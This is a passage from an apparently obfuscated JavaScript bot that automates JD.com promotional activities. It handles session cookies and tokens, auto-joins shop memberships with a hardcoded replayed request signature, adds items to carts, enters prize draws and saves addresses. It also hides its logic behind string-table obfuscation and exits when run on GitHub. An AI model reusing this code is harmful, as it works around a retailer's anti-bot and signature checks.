`${__Oxe7d5d[0x7]}${$[__Oxe7d5d[0x1]]}${__Oxe7d5d[0x26]}`;_0x2b98x4= `${__Oxe7d5d[0x9]}${$[__Oxe7d5d[0xa]]}${__Oxe7d5d[0x21]}${encodeURIComponent($.Pin)}${__Oxe7d5d[0x27]}${$[__Oxe7d5d[0x29]][__Oxe7d5d[0x28]]}${__Oxe7d5d[0x2]}`;break;case __Oxe7d5d[0x2d]:url= `${__Oxe7d5d[0x7]}${$[__Oxe7d5d[0x1]]}${__Oxe7d5d[0x2b]}`;_0x2b98x4= `${__Oxe7d5d[0x9]}${$[__Oxe7d5d[0xa]]}${__Oxe7d5d[0x21]}${encodeURIComponent($.Pin)}${__Oxe7d5d[0x2c]}${$[__Oxe7d5d[0xe]]}${__Oxe7d5d[0x2]}`;break;case __Oxe7d5d[0x2f]:url= `${__Oxe7d5d[0x7]}${$[__Oxe7d5d[0x1]]}${__Oxe7d5d[0x2e]}`;_0x2b98x4= `${__Oxe7d5d[0x2]}`;break;case __Oxe7d5d[0x34]:url= `${__Oxe7d5d[0x2]}${_0x2b98x3}${__Oxe7d5d[0x30]}`;_0x2b98x4= `${__Oxe7d5d[0x9]}${$[__Oxe7d5d[0xa]]}${__Oxe7d5d[0x21]}${encodeURIComponent($.Pin)}${__Oxe7d5d[0x31]}${$[__Oxe7d5d[0x32]]}${__Oxe7d5d[0x33]}`;break;case __Oxe7d5d[0x3a]:url= `${__Oxe7d5d[0x7]}${$[__Oxe7d5d[0x1]]}${__Oxe7d5d[0x35]}`;_0x2b98x4= `${__Oxe7d5d[0x9]}${$[__Oxe7d5d[0xa]]}${__Oxe7d5d[0x36]}${encodeURIComponent($.Pin)}${__Oxe7d5d[0x37]}${$[__Oxe7d5d[0xe]]}${__Oxe7d5d[0x38]}${$[__Oxe7d5d[0x39]]}${__Oxe7d5d[0x2]}`;break;case __Oxe7d5d[0x5]:;case __Oxe7d5d[0x3f]:url= `${__Oxe7d5d[0x7]}${$[__Oxe7d5d[0x1]]}${__Oxe7d5d[0x3b]}`;_0x2b98x4= `${__Oxe7d5d[0x9]}${$[__Oxe7d5d[0xa]]}${__Oxe7d5d[0x21]}${encodeURIComponent($.Pin)}${__Oxe7d5d[0x3c]}${encodeURIComponent(JSON[__Oxe7d5d[0x3e]]($[__Oxe7d5d[0x3d]]))}${__Oxe7d5d[0x2]}`;break;case __Oxe7d5d[0x41]:url= `${__Oxe7d5d[0x2]}${_0x2b98x3}${__Oxe7d5d[0x40]}${_0x2b98x2}${__Oxe7d5d[0x2]}`;_0x2b98x4= `${__Oxe7d5d[0x9]}${$[__Oxe7d5d[0xa]]}${__Oxe7d5d[0x21]}${encodeURIComponent($.Pin)}${__Oxe7d5d[0x2]}`;if(_0x2b98x2== __Oxe7d5d[0x41]){_0x2b98x4+= `${__Oxe7d5d[0x42]}${$[__Oxe7d5d[0x43]]}${__Oxe7d5d[0x2]}`};break;case __Oxe7d5d[0x47]:url= `${__Oxe7d5d[0x7]}${_0x2b98x3}${__Oxe7d5d[0x44]}`;_0x2b98x4= `${__Oxe7d5d[0x9]}${$[__Oxe7d5d[0xa]]}${__Oxe7d5d[0x21]}${encodeURIComponent($.Pin)}${__Oxe7d5d[0x45]}${$[__Oxe7d5d[0x46]]}${__Oxe7d5d[0x2]}`;break;case __Oxe7d5d[0x5c]:url= `${__Oxe7d5d[0x7]}${$[__Oxe7d5d[0x1]]}${__Oxe7d5d[0x48]}`;_0x2b98x4= `${__Oxe7d5d[0x17]}${$[__Oxe7d5d[0xe]]}${__Oxe7d5d[0x21]}${encodeURIComponent($.Pin)}${__Oxe7d5d[0x49]}${$[__Oxe7d5d[0x39]]}${__Oxe7d5d[0x19]}${$[__Oxe7d5d[0xa]]}${__Oxe7d5d[0x4a]}${encodeURIComponent($[__Oxe7d5d[0x4b]])}${__Oxe7d5d[0x4c]}${encodeURIComponent($[__Oxe7d5d[0x4d]])}${__Oxe7d5d[0x4e]}${$[__Oxe7d5d[0x4f]]}${__Oxe7d5d[0x50]}${encodeURIComponent($[__Oxe7d5d[0x51]])}${__Oxe7d5d[0x52]}${encodeURIComponent($[__Oxe7d5d[0x53]])}${__Oxe7d5d[0x54]}${encodeURIComponent($[__Oxe7d5d[0x55]])}${__Oxe7d5d[0x56]}${$[__Oxe7d5d[0x57]]}${__Oxe7d5d[0x58]}${$[__Oxe7d5d[0x59]]}${__Oxe7d5d[0x5a]}${encodeURIComponent($[__Oxe7d5d[0x5b]])}${__Oxe7d5d[0x2]}`;break;case __Oxe7d5d[0x60]:url= `${__Oxe7d5d[0x7]}${$[__Oxe7d5d[0x1]]}${__Oxe7d5d[0x48]}`;_0x2b98x4= `${__Oxe7d5d[0x17]}${$[__Oxe7d5d[0xe]]}${__Oxe7d5d[0x21]}${encodeURIComponent($.Pin)}${__Oxe7d5d[0x49]}${$[__Oxe7d5d[0x39]]}${__Oxe7d5d[0x19]}${$[__Oxe7d5d[0xa]]}${__Oxe7d5d[0x4a]}${encodeURIComponent($[__Oxe7d5d[0x4b]])}${__Oxe7d5d[0x4c]}${encodeURIComponent($[__Oxe7d5d[0x4d]])}${__Oxe7d5d[0x4e]}${$[__Oxe7d5d[0x4f]]}${__Oxe7d5d[0x50]}${encodeURIComponent($[__Oxe7d5d[0x51]])}${__Oxe7d5d[0x52]}${encodeURIComponent($[__Oxe7d5d[0x53]])}${__Oxe7d5d[0x54]}${encodeURIComponent($[__Oxe7d5d[0x55]])}${__Oxe7d5d[0x5d]}${$[__Oxe7d5d[0x5e]]}${__Oxe7d5d[0x5f]}${$[__Oxe7d5d[0x57]]}${__Oxe7d5d[0x58]}${$[__Oxe7d5d[0x59]]}${__Oxe7d5d[0x5a]}${encodeURIComponent($[__Oxe7d5d[0x5b]])}${__Oxe7d5d[0x2]}`;break;default:console[__Oxe7d5d[0x62]](`${__Oxe7d5d[0x61]}${_0x2b98x2}${__Oxe7d5d[0x2]}`)};let _0x2b98x8=getPostRequest(url,_0x2b98x4,_0x2b98x5);return  new Promise(async (_0x2b98x9)=>{$[__Oxe7d5d[0x68]](_0x2b98x8,(_0x2b98xa,_0x2b98xb,_0x2b98xc)=>{try{setActivityCookie(_0x2b98xb);if(_0x2b98xa){if(_0x2b98xb&&  typeof _0x2b98xb[__Oxe7d5d[0x63]]!= __Oxe7d5d[0x64]){if(_0x2b98xb[__Oxe7d5d[0x63]]== 493){console[__Oxe7d5d[0x62]](__Oxe7d5d[0x65]);$[__Oxe7d5d[0x0]]= true}};console[__Oxe7d5d[0x62]](`${__Oxe7d5d[0x2]}${$[__Oxe7d5d[0x66]](_0x2b98xa,_0x2b98xa)}${__Oxe7d5d[0x2]}`);console[__Oxe7d5d[0x62]](`${__Oxe7d5d[0x2]}${_0x2b98x2}${__Oxe7d5d[0x67]}`)}else {dealReturn(_0x2b98x2,_0x2b98xc)}}catch(e){console[__Oxe7d5d[0x62]](e,_0x2b98xb)}finally{_0x2b98x9()}})})}(function(_0x2b98xd,_0x2b98xe,_0x2b98xf,_0x2b98x10,_0x2b98x11,_0x2b98x12){_0x2b98x12= __Oxe7d5d[0x64];_0x2b98x10= function(_0x2b98x13){if( typeof alert!== _0x2b98x12){alert(_0x2b98x13)};if( typeof console!== _0x2b98x12){console[__Oxe7d5d[0x62]](_0x2b98x13)}};_0x2b98xf= function(_0x2b98x14,_0x2b98xd){return _0x2b98x14+ _0x2b98xd};_0x2b98x11= _0x2b98xf(__Oxe7d5d[0x69],_0x2b98xf(_0x2b98xf(__Oxe7d5d[0x6a],__Oxe7d5d[0x6b]),__Oxe7d5d[0x6c]));try{_0x2b98xd= __encode;if(!( typeof _0x2b98xd!== _0x2b98x12&& _0x2b98xd=== _0x2b98xf(__Oxe7d5d[0x6d],__Oxe7d5d[0x6e]))){_0x2b98x10(_0x2b98x11)}}catch(e){_0x2b98x10(_0x2b98x11)}})({})


async function dealReturn(type, data) {
    let res = ''
    try {
        if (type != 'accessLogWithAD' || type != 'drawContent') {
            if (data) {
                res = JSON.parse(data);
            }
        }
    } catch (e) {
        console.log(`${type} 执行任务异常`);
        console.log(data);
        $.runFalag = false;
    }
    try {
        switch (type) {
            case 'isvObfuscator':
                if (typeof res == 'object') {
                    if (res.errcode == 0) {
                        if (typeof res.token != 'undefined') $.Token = res.token
                    } else if (res.message) {
                        console.log(`isvObfuscator ${res.message || ''}`)
                    } else {
                        console.log(data)
                    }
                } else {
                    // console.log(data)
                }
                break;
            case 'getSimpleActInfoVo':
                if (typeof res == 'object') {
                    if (res.result && res.result === true) {
                        if (typeof res.data.shopId != 'undefined') $.shopId = res.data.shopId
                        if (typeof res.data.venderId != 'undefined') $.venderId = res.data.venderId
                    } else if (res.errorMessage) {
                        console.log(`${type} ${res.errorMessage || ''}`)
                    } else {
                        console.log(`${type} ${data}`)
                    }
                } else {
                    console.log(`${type} ${data}`)
                }
                break;
            case 'getMyPing':
                if (typeof res == 'object') {
                    if (res.result && res.result === true) {
                        if (res.data && typeof res.data.secretPin != 'undefined') $.Pin = res.data.secretPin
                        if (res.data && typeof res.data.nickname != 'undefined') $.nickname = res.data.nickname
                    } else if (res.errorMessage) {
                        console.log(`${type} ${res.errorMessage || ''}`)
                    } else {
                        console.log(`${type} ${data}`)
                    }
                } else {
                    console.log(`${type} ${data}`)
                }
                break;
            case 'getUserInfo':
                if (typeof res == 'object') {
                    if (res.result && res.result === true) {
                        if (res.data && typeof res.data.yunMidImageUrl != 'undefined') $.attrTouXiang = res.data.yunMidImageUrl || "https://img10.360buyimg.com/imgzone/jfs/t1/7020/27/13511/6142/5c5138d8E4df2e764/5a1216a3a5043c5d.png"
                    } else if (res.errorMessage) {
                        console.log(`${type} ${res.errorMessage || ''}`)
                    } else {
                        console.log(`${type} ${data}`)
                    }
                } else {
                    console.log(`${type} ${data}`)
                }
                break;
            case 'activityContent':
                if (typeof res == 'object') {
                    if (res.result && res.result === true) {
                        let activityVo = res.data.activityVo
                        if (typeof activityVo == 'object') {
                            $.activityName = activityVo.activityName
                            $.drawTime = activityVo.drawTime
                            $.needFollow = activityVo.needFollow
                            $.actRule = activityVo.actRule
                            $.activityType = activityVo.activityType
                        }
                        $.productVos = res.data.prodectVos
                        $.hasFollow = res.data.hasFollow
                        let joinRecord = res.data.joinRecord
                        if (typeof joinRecord == 'object') {
                            $.uuid = joinRecord.myUuid
                            if ($.index == 1) {
                                $.friendUuid = $.uuid
                            }
                            // $.friendUuidArrays.push($.uuid)
                            // console.log("当前助力池为:" + JSON.stringify($.friendUuidArrays))
                        }
                        $.addCarts = res.data.addCarts
                        $.jsNum = res.data.jsNum
                        $.totals = res.data.totals
                    } else if (res.errorMessage) {
                        console.log(`${type} ${res.errorMessage || ''}`)
                    } else {
                        console.log(`${type} ${data}`)
                    }
                } else {
                    console.log(`${type} ${data}`)
                }
                break;
            case 'currentTime':
                if (typeof res == 'object') {
                    if (res.result && res.result === true) {
                        $.curTime = res.data.systime
                        console.log(`当前时间为：`)
                    } else if (res.errorMessage) {
                        console.log(`${type} ${res.errorMessage || ''}`)
                    } else {
                        console.log(`${type} ${data}`)
                    }
                } else {
                    console.log(`${type} ${data}`)
                }
                break;
            case 'getActMemberInfo':
                if (typeof res == 'object') {
                    if (res.result && res.result === true) {
                        $.actMemberStatus = res.data.actMemberStatus
                        $.openCardStatus = res.data.openCard
                        // let cardList1 = res.data.cardList1 || []
                        // let cardList2 = res.data.cardList2 || []
                        // let cardList = res.data.cardList || []
                        // let openCardList = res.data.openCardList || []
                        // $.openList = [...cardList, ...cardList1, ...cardList2, ...openCardList]
                        // $.allOpenCard = res.data.allOpenCard || res.data.isOpenCardStatus || false
                        // $.openCardScore1 = res.data.score1 || 0
                        // $.openCardScore2 = res.data.score2 || 0
                        // $.drawScore = res.data.drawScore || 0
                        // if (res.data.beans || res.data.addBeanNum) console.log(`开卡获得:${res.data.beans || res.data.addBeanNum}豆`)
                    } else if (res.errorMessage) {
                        console.log(`${type} ${res.errorMessage || ''}`)
                    } else {
                        console.log(`${type} ${data}`)
                    }
                } else {
                    console.log(`${type} ${data}`)
                }
                break;
            case 'getProduct':
                if (typeof res == 'object') {
                    if (res.result && res.result === true) {
                        $.productList = res.data
                    } else if (res.errorMessage) {
                        console.log(`${type} ${res.errorMessage || ''}`)
                    } else {
                        console.log(`${type} ${data}`)
                    }
                } else {
                    console.log(`${type} ${data}`)
                }
                break;
            case 'quickAddSku':
                if (typeof res == 'object') {
                    if (res.result && res.result === true) {
                        if (typeof res.data == 'object') {
                            $.addCarts = res.data.hasAddCartSize;
                            console.log(`本次加购${res.data.hasAddCartSize}件商品`)
                        }
                    }
                }
                break;
            case 'drawResult':
                if (typeof res == 'object') {
                    $.prizeInfo = ''
                    if (res.result && res.result === true) {
                        console.log(JSON.stringify(res))
                        if (typeof res.data == 'object') {
                            if (res.data.message == '中奖') {
                                $.message += `京东账号${$.UserName}获得${res.data.drawName}\n`
                                console.log(`恭喜中奖~获得${res.data.drawName}`)
                                $.prizeInfo = res.data
                            }
                            else {
                                console.log(`恭喜获得了空气- -`)
                            }
                        }
                    }
                }
                break;
            case 'saveAddressWithGenerateId':
            case 'saveAddress':
                console.log(JSON.stringify(res))
                if (typeof res == 'object') {
                    if (res.result && res.result === true) {
                        console.log(`地址填写成功！`)
                        $.message += `填写成功！\n`
                    } else {
                        console.log(`${type} ${data}`)
                    }
                }
                break;
            default:
                console.log(`${type}-> ${data}`);
        }
        if (typeof res == 'object') {
            if (res.errorMessage) {
                if (res.errorMessage.indexOf('火爆') > -1) {
                    $.hotFlag = true
                }
            }
        }
    } catch (e) {
        console.log(e)
    }
}

function timeConvert(timestamp) {
    //num:0 YYYY-MM-DD  num:1  YYYY-MM-DD hh:mm:ss // timestamp:时间戳
    //将时间戳转换成正常时间格式
    var date = new Date(timestamp); //时间戳为10位需*1000，时间戳为13位的话不需乘1000
    var Y = date.getFullYear() + "-";
    var M =
        (date.getMonth() + 1 < 10
            ? "0" + (date.getMonth() + 1)
            : date.getMonth() + 1) + "-";
    var D = date.getDate() + " ";
    var h = date.getHours() + ":";
    var m =
        (date.getMinutes() < 10 ? "0" + date.getMinutes() : date.getMinutes()) +
        ":";
    var s = date.getSeconds();
    return Y + M + D + h + m + s;
}

function getCK() {
    return new Promise(resolve => {
        let get = {
            url: `${$.activityUrl}`,
            followRedirect: false,
            headers: {
                "User-Agent": $.UA,
            },
            timeout: 30000
        }
        $.get(get, async (err, resp, data) => {
            try {
                if (err) {
                    if (resp && typeof resp.statusCode != 'undefined') {
                        if (resp.statusCode == 493) {
                            console.log('此ip已被限制，请过10分钟后再执行脚本\n')
                            $.outFlag = true
                        }
                    }
                    console.log(`${$.toStr(err)}`)
                    console.log(`${$.name} cookie API请求失败，请检查网路重试`)
                } else {
                    let end = data.match(/(活动已经结束)/) && data.match(/(活动已经结束)/)[1] || ''
                    if (end) {
                        $.activityEnd = true
                        console.log('活动已结束')
                    }
                    setActivityCookie(resp)
                }
            } catch (e) {
                $.logErr(e, resp)
            } finally {
                resolve();
            }
        })
    })
}

function getPostRequest(url, body, method = "POST") {
    let headers = {
        "Accept": "application/json",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-cn",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": cookie,
        "User-Agent": $.UA,
        "X-Requested-With": "XMLHttpRequest"
    }
    if (url.indexOf($.domain) > -1) {
        headers["Referer"] = `${$.activityUrl}&sid=&un_area=13_1007_4909_59742`
        headers["Origin"] = `https://${$.domain}`
        // headers["Cookie"] = `${lz_jdpin_token_cookie && lz_jdpin_token_cookie || ''}${$.Pin && "AUTH_C_USER=" + $.Pin + ";" || ""}${activityCookie}`
        headers["Cookie"] = `IsvToken=${$.Token};` + `${lz_jdpin_token_cookie && lz_jdpin_token_cookie || ''}${$.Pin && "AUTH_C_USER=" + $.Pin + ";" || ""}${activityCookie}`
    }
    // console.log(headers)
    // console.log(headers.Cookie)
    return { url: url, method: method, headers: headers, body: body, timeout: 30000 };
}

function setActivityCookie(resp) {
    let LZ_TOKEN_KEY = ''
    let LZ_TOKEN_VALUE = ''
    let lz_jdpin_token = ''
    let setcookies = resp && resp['headers'] && (resp['headers']['set-cookie'] || resp['headers']['Set-Cookie'] || '') || ''
    let setcookie = ''
    if (setcookies) {
        if (typeof setcookies != 'object') {
            setcookie = setcookies.split(',')
        } else setcookie = setcookies
        for (let ck of setcookie) {
            let name = ck.split(";")[0].trim()
            if (name.split("=")[1]) {
                // console.log(name.replace(/ /g,''))
                if (name.indexOf('LZ_TOKEN_KEY=') > -1) LZ_TOKEN_KEY = name.replace(/ /g, '') + ';'
                if (name.indexOf('LZ_TOKEN_VALUE=') > -1) LZ_TOKEN_VALUE = name.replace(/ /g, '') + ';'
                if (name.indexOf('lz_jdpin_token=') > -1) lz_jdpin_token = '' + name.replace(/ /g, '') + ';'
                if (name.indexOf('LZ_AES_PIN=') > -1) $.LZ_AES_PIN = '' + name.replace(/ /g, '') + ';'
            }
        }
    }
    if (LZ_TOKEN_KEY && LZ_TOKEN_VALUE && !$.LZ_AES_PIN) activityCookie = `${LZ_TOKEN_KEY} ${LZ_TOKEN_VALUE}`
    if (LZ_TOKEN_KEY && LZ_TOKEN_VALUE && $.LZ_AES_PIN) activityCookie = `${LZ_TOKEN_KEY} ${LZ_TOKEN_VALUE} ${$.LZ_AES_PIN}`
    if (lz_jdpin_token) lz_jdpin_token_cookie = lz_jdpin_token
    // console.log(activityCookie)
}

function getQueryString(url, name) {
    let reg = new RegExp("(^|[&?])" + name + "=([^&]*)(&|$)");
    let r = url.match(reg);
    if (r != null) {
        return unescape(r[2]);
    }
    return '';
}

async function joinShop() {
    if (!$.joinVenderId) return
    return new Promise(async resolve => {
        $.errorJoinShop = '活动太火爆，请稍后再试'
        let activityId = ``
        if ($.shopactivityId) activityId = `,"activityId":${$.shopactivityId}`
        let body = `{"venderId":"${$.venderId}","shopId":"${$.shopId}","bindByVerifyCodeFlag":1,"registerExtend":{},"writeChildFlag":0${activityId},"channel":406}`
        let h5st = '20220412164634306%3Bf5299392a200d6d9ffced997e5790dcc%3B169f1%3Btk02wc0f91c8a18nvWVMGrQO1iFlpQre2Sh2mGtNro1l0UpZqGLRbHiyqfaUQaPy64WT7uz7E%2FgujGAB50kyO7hwByWK%3B77c8a05e6a66faeed00e4e280ad8c40fab60723b5b561230380eb407e19354f7%3B3.0%3B1649753194306'
        const options = {
            url: `https://api.m.jd.com/client.action?appid=jd_shop_member&functionId=bindWithVender&body=${body}&clientVersion=9.2.0&client=H5&uuid=88888&h5st=${h5st}`,
            headers: {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
                'cookie': cookie,
                'origin': 'https://shopmember.m.jd.com/',
                'user-agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36",
            }
        }
        $.get(options, async (err, resp, data) => {
            try {
                data = data && data.match(/jsonp_.*?\((.*?)\);/) && data.match(/jsonp_.*?\((.*?)\);/)[1] || data
                // console.log(data)
                let res = $.toObj(data, data);
                if (res && typeof res == 'object') {
                    if (res && res.success === true) {
                        console.log(res.message)
                        $.errorJoinShop = res.message
                        if (res.result && res.result.giftInfo) {
                            for (let i of res.result.giftInfo.giftList) {
                                console.log(`入会获得:${i.discountString}${i.prizeName}${i.secondLineDesc}`)
                            }
                        }
                    } else if (res && typeof res == 'object' && res.message) {
                        $.errorJoinShop = res.message
                        console.log(`${res.message || ''}`)
                    } else {
                        console.log(data)
                    }
                } else {
                    console.log(data)
                }
            } catch (e) {
                $.logErr(e, resp)
            } finally {
                resolve();
            }
        })
    })
}
function jsonParse(str) {
    if (typeof str == "string") {
        try {
            return JSON.parse(str);
        } catch (e) {
            console.log(e);
            $.msg($.name, '', '请勿随意在BoxJs输入框修改内容\n建议通过脚本去获取cookie')
            return [];
        }
    }
}

function uuid(x = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx") {
    return x.replace(/[xy]/g, function (x) {
        const r = 16 * Math.random() | 0, n = "x" === x ? r : 3 & r | 8;
        return n.toString(36)
    })
}

function randomArray(arr, count) {
    count = count || arr.length
    let shuffled = arr.slice(0), i = arr.length, min = i - count, temp,
        index;
    while (i-- > min) {
        index = Math.floor((i + 1) * Math.random());
        temp = shuffled[index];
        shuffled[index] = shuffled[i];
        shuffled[i] = temp;
    }
    return shuffled.slice(min);
}

function randomWord(randomFlag, min, max) {
    var str = "",
        range = min,
        arr = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'];

    // 随机产生
    if (randomFlag) {
        range = Math.round(Math.random() * (max - min)) + min;
    }
    for (var i = 0; i < range; i++) {
        pos = Math.round(Math.random() * (arr.length - 1));
        str += arr[pos];
    }
    return str;
}
// prettier-ignore
function Env(t, e) { "undefined" != typeof process && JSON.stringify(process.env).indexOf("GITHUB") > -1 && process.exit(0); class s { constructor(t) { this.env = t } send(t, e = "GET") { t = "string" == typeof t ? { url: t } : t; let s = this.get; return "POST" === e && (s = this.post), new Promise((e, i) => { s.call(this, t, (t, s, r) => { t ? i(t) : e(s) }) }) } get(t) { return this.send.call(this.env, t) } post(t) { return this.send.call(this.env, t, "POST") } } return new class { constructor(t, e) { this.name = t, this.http = new s(this), this.data = null, this.dataFile = "box.dat", this.logs = [], this.isMute = !1, this.isNeedRewrite = !1, this.logSeparator = "\n", this.startTime = (new Date).getTime(), Object.assign(this, e), this.log("", `🔔${this.name}, 开始!`) } isNode() { return "undefined" != typeof module && !!module.exports } isQuanX() { return "undefined" != typeof $task } isSurge() { return "undefined" != typeof $httpClient && "undefined" == typeof $loon } isLoon() { return "undefined" != typeof $loon } toObj(t, e = null) { try { return JSON.parse(t) } catch { return e } } toStr(t, e = null) { try { return JSON.stringify(t) } catch { return e } } getjson(t, e) { let s = e; const i = this.getdata(t); if (i) try { s = JSON.parse(this.getdata(t)) } catch { } return s } setjson(t, e) { try { return this.setdata(JSON.stringify(t), e) } catch { return !1 } } getScript(t) { return new Promise(e => { this.get({ url: t }, (t, s, i) => e(i)) }) } runScript(t, e) { return new Promise(s => { let i = this.getdata("@chavy_boxjs_userCfgs.httpapi"); i = i ? i.replace(/\n/g, "").trim() : i; let r = this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout"); r = r ? 1 * r : 20, r = e && e.timeout ? e.timeout : r; const [o, h] = i.split("@"), n = { url: `http://${h}/v1/scripting/evaluate`, body: { script_text: t, mock_type: "cron", timeout: r }, headers: { "X-Key": o, Accept: "*/*" } }; this.post(n, (t, e, i) => s(i)) }).catch(t => this.logErr(t)) } loaddata() { if (!this.isNode()) return {}; { this.fs = this.fs ? this.fs : require("fs"), this.path = this.path ? this.path : require("path"); const t = this.path.resolve(this.dataFile), e = this.path.resolve(process.cwd(), this.dataFile), s = this.fs.existsSync(t), i = !s && this.fs.existsSync(e); if (!s && !i) return {}; { const i = s ? t : e; try { return JSON.parse(this.fs.readFileSync(i)) } catch (t) { return {} } } } } writedata() { if (this.isNode()) { this.fs = this.fs ? this.fs : require("fs"), this.path = this.path ? this.path : require("path"); const t = this.path.resolve(this.dataFile), e = this.path.resolve(process.cwd(), this.dataFile), s = this.fs.existsSync(t), i = !s && this.fs.existsSync(e), r = JSON.stringify(this.data); s ? this.fs.writeFileSync(t, r) : i ? this.fs.writeFileSync(e, r) : this.fs.writeFileSync(t, r) } } lodash_get(t, e, s) { const i = e.replace(/\[(\d+)\]/g, ".$1").split("."); let r = t; for (const t of i) if (r = Object(r)[t], void 0 === r) return s; return r } lodash_set(t, e, s) { return Object(t) !== t ? t : (Array.isArray(e) || (e = e.toString().match(/[^.[\]]+/g) || []), e.slice(0, -1).reduce((t, s, i) => Object(t[s]) === t[s] ? t[s] : t[s] = Math.abs(e[i + 1]) >> 0 == +e[i + 1] ? [] : {}, t)[e[e.length - 1]] = s, t) } getdata(t) { let e = this.getval(t); if (/^@/.test(t)) { const [, s, i] = /^@(.*?)\.(.*?)$/.exec(t), r = s ? this.getval(s) : ""; if (r) try { const t = JSON.parse(r); e = t ? this.lodash_get(t, i, "") : e } catch (t) { e = "" } } return e } setdata(t, e) { let s = !1; if (/^@/.test(e)) { const [, i, r] = /^@(.*?)\.(.*?)$/.exec(e), o = this.getval(i), h = i ? "null" === o ? null : o || "{}" : "{}"; try { const e = JSON.parse(h); this.lodash_set(e, r, t), s = this.setval(JSON.stringify(e), i) } catch (e) { const o = {}; this.lodash_set(o, r, t), s = this.setval(JSON.stringify(o), i) } } else s = this.setval(t, e); return s } getval(t) { return this.isSurge() || this.isLoon() ? $persistentStore.read(t) : this.isQuanX() ? $prefs.valueForKey(t) : this.isNode() ? (this.data = this.loaddata(), this.data[t]) : this.data && this.data[t] || null } setval(t, e) { return this.isSurge() || this.isLoon() ? $persistentStore.write(t, e) : this.isQuanX() ? $prefs.setValueForKey(t, e) : this.isNode() ? (this.data = this.loaddata(), this.data[e] = t, this.writedata(), !0) : this.data && this.data[e] || null } initGotEnv(t) { this.got = this.got ? this.got : require("got"), this.cktough = this.cktough ? this.cktough : require("tough-cookie"), this.ckjar = this.ckjar ? this.ckjar : new this.cktough.CookieJar, t && (t.headers = t.headers ? t.headers : {}, void 0 === t.headers.Cookie && void 0 === t.cookieJar && (t.cookieJar = this.ckjar)) } get(t, e = (() => { })) { t.headers && (delete t.headers["Content-Type"], delete t.headers["Content-Length"]), this.isSurge() || this.isLoon() ? (this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, { "X-Surge-Skip-Scripting": !1 })), $httpClient.get(t, (t, s, i) => { !t && s && (s.body = i, s.statusCode = s.status), e(t, s, i) })) : this.isQuanX() ? (this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, { hints: !1 })), $task.fetch(t).then(t => { const { statusCode: s, statusCode: i, headers: r, body: o } = t; e(null, { status: s, statusCode: i, headers: r, body: o }, o) }, t => e(t))) : this.isNode() && (this.initGotEnv(t), this.got(t).on("redirect", (t, e) => { try { if (t.headers["set-cookie"]) { const s = t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString(); s && this.ckjar.setCookieSync(s, null), e.cookieJar = this.ckjar } } catch (t) { this.logErr(t) } }).then(t => { const { statusCode: s, statusCode: i, headers: r, body: o } = t; e(null, { status: s, statusCode: i, headers: r, body: o }, o) }, t => { const { message: s, response: i } = t; e(s, i, i && i.body) })) } post(t, e = (() => { })) { if (t.body && t.headers && !t.headers["Content-Type"] && (t.headers["Content-Type"] = "application/x-www-form-urlencoded"), t.headers && delete t.headers["Content-Length"], this.isSurge() || this.isLoon()) this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, { "X-Surge-Skip-Scripting": !1 })), $httpClient.post(t, (t, s, i) => { !t && s && (s.body = i, s.statusCode = s.status), e(t, s, i) }); else if (this.isQuanX()) t.method = "POST", this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, { hints: !1 })), $task.fetch(t).then(t => { const { statusCode: s, statusCode: i, headers: r, body: o } = t; e(null, { status: s, statusCode: i, headers: r, body: o }, o) }, t => e(t)); else if (this.isNode()) { this.initGotEnv(t); const { url: s, ...i } = t; this.got.post(s, i).then(t => { const { statusCode: s, statusCode: i, headers: r, body: o } = t; e(null, { status: s, statusCode: i, headers: r, body: o }, o) }, t => { const { message: s, response: i } = t; e(s, i, i && i.body) }) } } time(t, e = null) { const s = e ? new Date(e) : new Date; let i = { "M+": s.getMonth() + 1, "d+": s.getDate(), "H+": s.getHours(), "m+": s.getMinutes(), "s+": s.getSeconds(), "q+": Math.floor((s.getMonth() + 3) / 3), S: s.getMilliseconds() }; /(y+)/.test(t) && (t = t.replace(RegExp.$1, (s.getFullYear() + "").substr(4 - RegExp.$1.length))); for (let e in i) new RegExp("(" + e + ")").test(t) && (t = t.replace(RegExp.$1, 1 == RegExp.$1.length ? i[e] : ("00" + i[e]).substr(("" + i[e]).length))); return t } msg(e = t, s = "", i = "", r) { const o = t => { if (!t) return t; if ("string" == typeof t) return this.isLoon() ? t : this.isQuanX() ? { "open-url": t } : this.isSurge() ? { url: t } : void 0; if ("object" == typeof t) { if (this.isLoon()) { let e = t.openUrl || t.url || t["open-url"], s = t.mediaUrl || t["media-url"]; return { openUrl: e, mediaUrl: s } } if (this.isQuanX()) { let e = t["open-url"] || t.url || t.openUrl, s = t["media-url"] || t.mediaUrl; return { "open-url": e, "media-url": s } } if (this.isSurge()) { let e = t.url || t.openUrl || t["open-url"]; return { url: e } } } }; if (this.isMute || (this.isSurge() || this.isLoon() ? $notification.post(e, s, i, o(r)) : this.isQuanX() && $notify(e, s, i, o(r))), !this.isMuteLog) { let t = ["", "==============📣系统通知📣=============="]; t.push(e), s && t.push(s), i && t.push(i), console.log(t.join("\n")), this.logs = this.logs.concat(t) } } log(...t) { t.length > 0 && (this.logs = [...this.logs, ...t]), console.log(t.join(this.logSeparator)) } logErr(t, e) { const s = !this.isSurge() && !this.isQuanX() && !this.isLoon(); s ? this.log("", `❗️${this.name}, 错误!`, t.stack) : this.log("", `❗️${this.name}, 错误!`, t) } wait(t) { return new Promise(e => setTimeout(e, t)) } done(t = {}) { const e = (new Date).getTime(), s = (e - this.startTime) / 1e3; this.log("", `🔔${this.name}, 结束! 🕛 ${s} 秒`), this.log(), (this.isSurge() || this.isQuanX() || 